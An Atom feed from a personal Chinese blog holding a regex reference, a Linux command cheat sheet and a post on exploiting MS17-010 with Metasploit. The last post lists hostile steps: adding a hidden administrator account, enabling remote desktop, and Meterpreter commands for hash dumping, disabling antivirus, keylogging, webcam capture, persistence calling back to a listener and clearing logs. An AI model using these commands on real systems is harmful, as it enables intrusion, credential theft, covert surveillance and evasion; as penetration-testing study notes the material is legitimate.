<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://lhq159753.github.io/web.github.io/</id>
    <title>seemH</title>
    <updated>2021-10-07T14:00:51.825Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://lhq159753.github.io/web.github.io/"/>
    <link rel="self" href="https://lhq159753.github.io/web.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://lhq159753.github.io/web.github.io/images/avatar.png</logo>
    <icon>https://lhq159753.github.io/web.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, seemH</rights>
    <entry>
        <title type="html"><![CDATA[正则表达式]]></title>
        <id>https://lhq159753.github.io/web.github.io/post/zheng-ze-biao-da-shi/</id>
        <link href="https://lhq159753.github.io/web.github.io/post/zheng-ze-biao-da-shi/">
        </link>
        <updated>2021-10-05T07:18:52.000Z</updated>
        <content type="html"><![CDATA[<p>📙📙📙                          🕛</p>
<p>正则表达式用来在文件中匹配符合条件的字符串，正则是包含匹配。</p>
<p>在liunx中一些命令可以支持正则表达式<br>
通配符用来匹配符合条件的文件名，通配符是完全匹配。<br>
ls、find、cp这些命令不支持正则表达式，所以只能自己用shell自己的通配符来进行匹配<br>
📃</p>
<p><strong>元字符</strong>                                 ** 作用**<br>
*                      |  前一个字符匹配0次或任意多次                    🕐</p>
<pre><code>   .                       | 匹配除了换行字符外任意一个字符

 ^                       | 匹配行首，例：^hello会匹配以hello开头的行

   $                      | $ 匹配行尾，例：hello$匹配以hello结尾的行

   [ ]                     |匹配括号中指定的任意一个字符，只匹配一个字符
                              例：[aoeiu]匹配任意一个元音字母，[0-9]匹配任意一个  数字                                                                       🕑

   [^]                   |匹配除括号中的字符以外的任意一个字符。
                            例：[^0-9]匹配任意一位非数字字符 🕝

   \                      |转义符 用于取消讲特殊符号的含义取消  🕒
</code></pre>
<p>{n}                     |表示其前面的字符恰好出现几次。                                          例子：[0-9]\｛4\｝匹配4个数字   [1][3-8][0-9]{9}匹配手机电话号码</p>
<p>{n,}                      |表示其前面的字符出现不小于n次<br>
例：[0-9]{2,} 表示两位及以上的数字</p>
<p>{n,m}                | 表示其前面的字符至少出现了n次，最多出现m次<br>
例：    [a-z]{6,8} 匹配6到8位的小写字母       🕓</p>
<p>\cx	          匹配由x指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 'c' 字符。</p>
<p>\f	           匹配一个换页符。等价于 \x0c 和 \cL。</p>
<p>\n	           匹配一个换行符。等价于 \x0a 和 \cJ。</p>
<p>\r	            匹配一个回车符。等价于 \x0d 和 \cM。               🕔</p>
<p>\s	            匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。注意 Unicode 正则表达式会匹配全角空格符。</p>
<p>\S	           匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。</p>
<p>\t	            匹配一个制表符。等价于 \x09 和 \cI<br>
。<br>
\v           	匹配一个垂直制表符。等价于 \x0b 和 \cK。                  🕕</p>
<ul>
<li>匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 +。</li>
</ul>
<p>?	匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 ?。</p>
<p>\b	匹配一个单词边界，即字与空格间的位置。                 🕖<br>
\B	非单词边界匹配。</p>
<p>\cx	<br>
匹配由 x 指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 'c' 字符。</p>
<p>\d	匹配一个数字字符。等价于 [0-9]。         🕘</p>
<p>\D	<br>
匹配一个非数字字符。等价于 [^0-9]。</p>
<p>\f	<br>
匹配一个换页符。等价于 \x0c 和 \cL。</p>
<p>\n	<br>
匹配一个换行符。等价于 \x0a 和 \cJ。            🕙</p>
<p>\r	<br>
匹配一个回车符。等价于 \x0d 和 \cM。</p>
<p>\s	<br>
匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。</p>
<p>\S	匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。</p>
<p>\t	匹配一个制表符。等价于 \x09 和 \cI。</p>
<p>\v	匹配一个垂直制表符。等价于 \x0b 和 \cK。         🕜</p>
<p>\w	匹配字母、数字、下划线。等价于'[A-Za-z0-9_]'。</p>
<p>\W	匹配非字母、数字、下划线。等价于 '[^A-Za-z0-9_]'。</p>
<p>\xn	匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，'\x41' 匹配 &quot;A&quot;。'\x041' 则等价于 '\x04' &amp; &quot;1&quot;。正则表达式中可以使用 ASCII 编码。</p>
<p>\num	匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。例如，'(.)\1' 匹配两个连续的相同字符。</p>
<p>\n	标识一个八进制转义值或一个向后引用。如果 \n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。   🕞</p>
<p>\nm	标识一个八进制转义值或一个向后引用。如果 \nm 之前至少有 nm 个获得子表达式，则 nm 为向后引用。如果 \nm 之前至少有 n 个获取，则 n 为一个后跟文字 m 的向后引用。如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \nm 将匹配八进制转义值 nm。</p>
<p>\nml	如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。<br>
🕚</p>
<p>正则表达式的优先级别<br>
优先级别由上到下<br>
1️⃣  \	转义符</p>
<p>2️⃣   (), (?😃, (?=), []	圆括号和方括号</p>
<p>3️⃣   *, +, ?, {n}, {n,}, {n,m}	限定符</p>
<p>4️⃣  ^, $, \任何元字符、任何字符	定位点和序列（即：位置和顺序）</p>
<p>5️⃣  |	替换，&quot;或&quot;操作<br>
字符具有高于替换运算符的优先级，使得&quot;m|food&quot;匹配&quot;m&quot;或&quot;food&quot;。若要匹配&quot;mood&quot;或&quot;food&quot;，请使用括号创建子表达式，从而产生&quot;(m|f)ood&quot;。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[🐃Liunx相关命令]]></title>
        <id>https://lhq159753.github.io/web.github.io/post/liunx-xiang-guan-ming-ling/</id>
        <link href="https://lhq159753.github.io/web.github.io/post/liunx-xiang-guan-ming-ling/">
        </link>
        <updated>2021-09-27T09:27:52.000Z</updated>
        <content type="html"><![CDATA[<p>🤡   ls #查看当前目录下的文件     ls -l查看相关文件权限<br>
lspci -vvv #查看网卡驱动    lspci #查看网卡信息<br>
touch #创建一个文件<br>
mkdir #创建一个目录      mkdir -p 递归创建目录                              ⌚️<br>
cd 进入一个目录<br>
rm 删除文件<br>
▶️<br>
cat #适合查看较少的文件， cat -n显示行号<br>
more 适合查看文件较多，可以分页浏览<br>
less  #查看文件 可以搜索目标文件<br>
less +参数 +文件 （  -b 设置缓冲区大小，  -e 当文件显示结束自动离开， -f 强制打开特殊文件，例 目录 二进制文件， -i 忽略搜索时的大小写 ， -N显示每行的行号  ）<br>
head -n 查看目标为文件所需的几行<br>
mv 移动文件<br>
cp 复制文件 cp -p 递归的复制文件<br>
in 生成连接文件  in -s 生成为软链接 类似于Windows的快捷方式<br>
▶️<br>
useradd +name 创建用户        userdel 删除用户信息<br>
groupadd 创建组        groupdel  删除组<br>
权限更改 chmod<br>
（u 表示该文件的拥有者，g 表示与该文件的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。+ 表示增加权限、- 表示取消权限、= 表示唯一设定权限。r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该文件是个子目录或者该文件已经被设定过为可执行。）<br>
☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️</p>
<p>👓    chown 改变文件所属用户    # chown  +user +file<br>
chgrp   改变文件或目录所属组<br>
umask -S 查看权限更改默认权限<br>
▶️</p>
<ul>
<li>
<p>文件搜索命令<br>
find    *号代表某个字符     ？问代表单个字符<br>
find    /目标文件<br>
find /-size  +文件大小 （在根目录下查找大于多少的文件）     +n 大于  -n 小于  n 等于<br>
find /etc -cmin -5 （在etc 目录下查找五分钟被修改过的属性文件或者目录）<br>
-amin 访问时间<br>
-cmin文件属性<br>
-mmin 文件内容<br>
-a 两个条件同时满足<br>
-o 两个条件满足任意一个即可<br>
find /etc -size +163840 -a -size 204800   表示（查找大于80M小于100M 的文件）</p>
<p>-type 根据文件类型查找<br>
find /etc -name inittab -exec ls -l ｛｝\  （查找文件并显示详细信息）<br>
-exec / -ok命令 ｛｝\：<br>
根据用户所属组来查找文件 -user  -group</p>
<p>locate   ：查找文件在资料库中的位置<br>
updatedb  更新文件<br>
+i不区分大小写查找文件</p>
<p>which 搜索命令所在的目录<br>
whereis 搜索命令坐在的目录及帮助文档路径</p>
<p>grep 在文件中搜索字串匹配的行<br>
grep -i 忽略大小写查找文件<br>
grep -v排除制定字串</p>
<pre><code>▶️
</code></pre>
<p>获得帮助命令<br>
man 获得帮助信息<br>
whatis 直接查看配置命令的信息<br>
apropos  查看配置文件的简短信息</p>
<p>用户管理命令</p>
<p>useradd +用户名   ：创建一个用户<br>
passwd +用户名  ：创建新用户的密码<br>
tty ：本地终端          pts：远程终端     who 查看用户登陆<br>
w： 查看用户详细信息</p>
<p>▶️<br>
压缩解压命令</p>
</li>
</ul>
<p>gzip ：压缩文件只能压缩文件<br>
gunzip：解压缩  gzip -d   gunzip + 文件名.gz</p>
<p>tar：压缩目录  tat -c：打包    tar -v 显示信息  tar -f：指定文件名   tar -z打包同时压缩<br>
压缩后文件格式  ：tar.gz<br>
tar -x 解包    tar -z解压缩  压缩后文件格式： gz</p>
<p>zip：压缩文件或目录  zip 选项（-r）（压缩后文件名） （文件或目录）<br>
unzip：解压缩<br>
▶️</p>
<pre><code>网络命令
  
write  给用户发消息   Ctrl+D保存结束
write +用户名
wall 发广播消息  wall +消息
ping 测试网络连通性    ping +ip地址
ping -c 3表示连接3次
ifconfig：查看网卡信息 
mail 查看发送邮件
mail +用户名
last：查看用户登录信息   lastlog 查看用户登录最后一次信息
lastlog -u +用户名 只看某一用户
tracetoute ：显示数据包到主机的路径
traceroute +网站名
netstart 显示网络相关信息
netstart -t ：显示tcp协议    -u：udp协议     -l：监听
-r显示路由     -n 显示ip地址和端口号
netstart -tlun 查看本机监听的端口
netstart -an 查看本机所有网络端口
netstart -rn查看本机路由表



  ▶️挂载命令
  mount -t 文件系统   设备文件名   挂载点

       ▶️ 关机命令
shutdown
init 系统运行级别 
0 关机
1 用户
2 不完全多用户   不含NFS服务
3 完全多用户
4 未分配
5 图形界面
6 重启


  ▶️  vim  编辑器
  🤚快捷键方法
  gg:行尾
  x：删除光标所在处的字符
  nx：删除光标所在处后n个字符
  dd：删除光标所在行       ndd：删除n行
  dG：删除光标所在行带文件末尾位置
  D：删除光标所在处到行尾内容
  n1  n2d：删除指定范围的行
  行号+gg：快速移动到指定行
  ctrl + f 向下翻页
  ctrl +b 向上翻页
  ctrl +d 向下翻半页
  ctrl +u 向上翻半页
</code></pre>
<p>👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋</p>
<pre><code>插入命令：aio
复制和剪切： yy-p    和      dd-p
替换：r/R    恢复  u
</code></pre>
<p>：s/aa/bb/g  表示将光标所在行出现的包含aa的字符全部替换为bb<br>
：%s/aa/bb/g 将文档出现所有包含aa的字符中的aa替换为bb<br>
：12，23s/aa/bb/g 将文档从12行中所出现的所有包含aa的字符替换为bb<br>
：12，23s/^/#/ 将从12行到23行的行首加入#字符<br>
：g/^\s*$/d 将所有不好喊字符（空格也不包含）的空行删除<br>
：%s!\s*//.*!! 去掉所有的“//”注释</p>
<p>👓 yum 在线管理<br>
yum list  查询克用软件包列表<br>
安装：yum -y install +包名<br>
卸载:  yum -y remove +包名<br>
yum grouplist 列出所有可用的软件组列表<br>
yum groupinstall 列出组名：安装指定转件组<br>
yum groupremove 软件组名：卸载指定软件组</p>
<p>👓 权限管理<br>
setfacl 选项+文件名<br>
-m 设定acl权限<br>
-x 删除指定的acl权限<br>
-b 删除所有权限<br>
-d 指定默认acl权限<br>
-k 删除默认acl权限<br>
-R 递归设定acl权限<br>
👓 设定setuid的方法<br>
4代表 SUID<br>
chmod 4755 +文件名<br>
chmod u+s+文件名<br>
取消setUID<br>
chmod +755 文件名</p>
<pre><code>文件系统属性  chattr 权限
+：增加权限
-：删除权限
+：等于某权限
i：如果对文件设置  i   属性，不允许对文件进行删除，改名，也不能对添加和修改数据；如果对目录设定  i 权限 只能修改目录下文件的数据 不允许建立和删除文件。

a：对文件设置 a 属性，那么只能在文件中增加数据，但不能删除也不能修改数据；如果对目录设定 a权限，那么只能修改目录下文件的数据，但不允许建立和删除文件。
例子：chattr +i 文件/目录


查看文件系统属性：
lsattr  -a 显示所有文件和目录       
lasttr -d 若目标是目录 列出目录本身属性，而不是子文件


sudo权限
sudu操作对象是系统命令


👓文件系统查看命令

df：+选项+挂载点
-a 显示所有文件系统信息
-h 使用习惯单位显示容量  如KB MB GB
-T 显示文件系统类型
-m 以MB为单位显示容量
-k 以KB为单位显示容量


👓统计目录或文件大小
du：+选项+文件或目录
-a显示每个子文件的磁盘占用量
-h 使用习惯单位显示磁盘占用量 如KB MB GB
-s 统计占用量而不是列出子目录和子文件的占用量


👓文件系统修复命令
fsck ：+选项+分区设备文件名
-a 不现实用户提示  自动修复文件系统
-y 自动修复  一些文件系统只支持 -y参数



👓挂载命令
mount -l查询系统中已经挂载好的设备
mount -a 依据配置文件 /etc/fstab的内容 自动挂载
mount -t 文件系统加入文件类型来指定挂载的类型
mount -o remount ，rw/给予系统读写权限
挂载u盘
fdisk -l查看u盘设备文件名



💨查看系统中所有的进程
ps aux 查看系统中所有进程，
ps -le  查看系统中所有进程，

💨 查看系统健康状态

top +参数
参数：
d 秒数：指定top命令每隔几秒更新。默认为3秒
？或者n  显示交互模式的帮助
P  以CPU使用率排序，默认就是此项
M  以内存的使用率排序
N 以PID排序
q 退出top
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[如何利用  ms17-010开始进行渗透测试]]></title>
        <id>https://lhq159753.github.io/web.github.io/post/ru-he-li-yong-ms17-010-kai-shi-jin-xing-sheng-shen-tou-ce-shi/</id>
        <link href="https://lhq159753.github.io/web.github.io/post/ru-he-li-yong-ms17-010-kai-shi-jin-xing-sheng-shen-tou-ce-shi/">
        </link>
        <updated>2021-09-22T11:10:07.000Z</updated>
        <content type="html"><![CDATA[<p>🕎</p>
<figure data-type="image" tabindex="1"><img src="https://lhq159753.github.io/web.github.io//post-images/1632310067918.jpg" alt="" loading="lazy"></figure>
<pre><code>在进行渗透测试之前，先进行信息获取

利用nmap -Pn 扫描目标主机是否有对应的端口开启
进入msfconsole

打开数据库：service postgresql start

数据初始化：msfdb init

信息收集获取目标机的IP地址

使用msfsole攻击

search：漏洞模块路径查询

use：使用漏洞模块

show options：加载攻击模块并配置参数

set ：配置参数

payload;攻击荷载

RHOST：目标主机地址

LHOST：本机主机地址

run：执行

 渗透思维导图
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://lhq159753.github.io/web.github.io//post-images/1632310085495.png" alt="" loading="lazy"></figure>
<pre><code>🏳️‍🌈🏳️‍🌈🏳️‍🌈  在使用 Meterpreter payload攻击模块下
首先创建一个用户：net user +名字 +密码 /add
把刚才创建的用户设置为管理员
net localgroup administrators +名字 /add
在卡里把win7的远程桌面服务打开
C:\Windows\system32&gt;G ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWREORD /d 0 /f
</code></pre>
<p>然后在kali终端 打开rdesktop + 目标ip地址  ：3389</p>
<p>🌲后期渗透<br>
sysinfo             #查看目标主机系统信息<br>
run scraper         #查看目标主机详细信息<br>
run hashdump        #导出密码的哈希<br>
load kiwi           #加载<br>
ps                  #查看目标主机进程信息<br>
pwd                 #查看目标当前目录(windows)<br>
getlwd              #查看目标当前目录(Linux)<br>
search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件<br>
download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下<br>
upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下getpid              #查看当前Meterpreter Shell的进程<br>
PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上<br>
idletime            #查看主机运行时间<br>
getuid              #查看获取的当前权限<br>
getsystem           #提权<br>
run  killav         #关闭杀毒软件<br>
screenshot          #截图<br>
webcam_list         #查看目标主机的摄像头<br>
webcam_snap         #拍照<br>
webcam_stream       #开视频<br>
execute  参数  -f 可执行文件   #执行可执行程序<br>
run getgui -u hack -p 123    #创建hack用户，密码为123<br>
run getgui -e                #开启远程桌面<br>
keyscan_start                #开启键盘记录功能<br>
keyscan_dump                 #显示捕捉到的键盘记录信息<br>
keyscan_stop                 #停止键盘记录功能<br>
uictl  disable  keyboard     #禁止目标使用键盘<br>
uictl  enable   keyboard     #允许目标使用键盘<br>
uictl  disable  mouse        #禁止目标使用鼠标<br>
uictl  enable   mouse        #允许目标使用鼠标<br>
load                         #使用扩展库<br>
run				             #使用扩展库<br>
run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接<br>
192.168.27的4444端口，缺点是容易被杀毒软件查杀<br>
portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址<br>
clearev                       #清除日志</p>
<p>run post/windows/manage/migrate                  #自动进程迁移<br>
run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上<br>
run post/windows/manage/killav                   #关闭杀毒软件<br>
run post/windows/manage/enable_rdp               #开启远程桌面服务<br>
run post/windows/manage/autoroute                #查看路由信息<br>
run post/windows/gather/enum_logged_on_users     #列举当前登录的用户<br>
run post/windows/gather/enum_applications        #列举应用程序<br>
run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码<br>
run windows/gather/smart_hashdump                #dump出所有用户的hash</p>
]]></content>
    </entry>
</feed>